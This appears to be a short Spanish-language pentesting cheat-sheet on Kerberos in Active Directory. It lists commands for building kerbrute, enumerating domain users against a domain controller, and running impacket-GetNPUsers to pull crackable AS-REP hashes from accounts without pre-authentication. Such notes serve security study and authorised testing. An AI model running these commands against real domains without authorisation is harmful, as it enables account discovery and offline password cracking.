# Kerberos 

Tags: #Kerberos #AD #Windows 

Este es el puerto para Kerberos, que es el protocolo de autenticación predeterminado usado en AD. Kerberos es vital para el proceso de inicio de sesión y la concesión de tickets de acceso.
## Kerberos

```bash 
git clone https://github.com/ropnop/kerbrute           # Descargar la herramienta
❯ go build .                                           # Entramos al dir 'kerbrute' lo compilamos 

❯ kerbrute userenum -d <Domain> --dc <IP> <user.txt>   # Prueba a los usuarios de la lista y verifica si son existentes en el dominio 

# Nota: Si el usuario no cuenta con autenticacion previa de Kerberos, la herramienta puede arrojar el TGT (hash) para despues poder romperlo por fuerza bruta. 
```

```bash 
❯ impacket-GetNPUsers <domain/> -no-pass -usersfile <user.txt>   # Forma de enumerar usuarios validos en Kerberos 
```